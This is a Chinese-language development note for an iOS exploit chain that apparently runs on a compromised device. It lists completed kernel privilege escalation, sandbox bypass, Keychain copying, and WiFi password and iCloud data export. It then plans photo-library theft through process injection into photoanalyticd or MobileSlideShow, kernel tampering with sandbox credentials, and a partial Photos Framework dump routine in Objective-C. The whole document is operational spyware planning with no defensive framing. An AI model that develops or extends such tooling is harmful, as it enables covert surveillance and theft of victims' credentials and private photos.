# 获取相册照片的方法

## 当前 PE 状态

PE (Platform Exploit) 已在 MPD 进程中异步运行，功能包括：
- ✅ 内核提权
- ✅ 注入到 SpringBoard
- ✅ Sandbox 绕过
- ✅ Keychain/keybag 复制到 `/tmp`
- ✅ WiFi 密码导出
- ✅ iCloud 数据导出
- ❌ 相册照片导出（待实现）

---

## 获取相册照片的方法

### 方法 1: 注入到 photoanalyticd 进程

**目标进程:** `photoanalyticd` - 照片分析服务

**优势:**
- 该进程有相册访问权限
- 后台持续运行
- 可以直接访问 Photos Framework

**实现思路:**
```javascript
const photoProcess = "photoanalyticd";
let photoDumper = new InjectJS(photoProcess, photo_dumper_js, migFilterBypass);
if (photoDumper.inject()) {
    Sandbox.applyTokensForRemoteTask(photoDumper.task);
    photoDumper.destroy();
}
```

---

### 方法 2: 注入到 MobileSlideShow 进程

**目标进程:** `MobileSlideShow` - 照片应用后台服务

**优势:**
- 直接与照片 UI 相关
- 有完整的相册访问权限

**实现思路:**
```javascript
const slideShowProcess = "MobileSlideShow";
let photoExporter = new InjectJS(slideShowProcess, photo_exporter_js, migFilterBypass);
```

---

### 方法 3: 绕过相册沙盒限制

**原理:** 利用内核读写能力，直接绕过沙盒检查

**步骤:**
1. 获取当前进程的 `proc` 结构
2. 修改 `ucred` 中的沙盒配置
3. 直接读取相册文件

**关键内核偏移:**
- `proc_ucred` - 进程凭证
- `ucred_cr_label` - 沙盒标签
- `vnode` - 文件系统节点

**实现思路:**
```javascript
// 获取相册目录 vnode
let photoDir = "/var/mobile/Media/DCIM/";
// 使用内核读写绕过沙盒
Sandbox.bypassAndRead(photoDir);
```

---

### 方法 4: 使用 Photos Framework (Objective-C)

**注入代码示例:**

```objc
// photo_dumper.m
#import <Photos/Photos.h>

void dumpPhotos() {
    PHFetchResult *albums = [PHAssetCollection fetchAssetCollectionsWithType:PHAssetCollectionTypeAlbum
                                                                      subtype:PHAssetCollectionSubtypeAny
                                                                      options:nil];
    
    for (PHAssetCollection *album in albums) {
        PHFetchResult *assets = [PHAsset fetchAssetsInAssetCollection:album options:nil];
        
        for (PHAsset *asset in assets) {
            if (asset.mediaType == PHAssetMediaTypeImage) {
                // 导出图片到 /tmp/photos/
                PHImageRequestOptions *options = [[PHImageRequestOptions alloc] init];
                // ... 导出逻辑
            }
        }
    }
}
```

---

## 推荐方案

**优先级:**
1. **方法 1** - 注入 `photoanalyticd`，最简单可靠
2. **方法 3** - 内核绕过，最强大但复杂
3. **方法 2** - 注入 `MobileSlideShow`，需要照片 App 运行

---

## 待实现文件

需要创建以下文件：
- `photo_dumper.js` - 相册导出注入代码
- 在 `pe_main.js` 中添加注入逻辑

---

## 注意事项

- 照片文件可能很大，需要考虑存储空间
- 导出速度取决于照片数量和大小
- 可能需要用户授权（首次访问相册时）
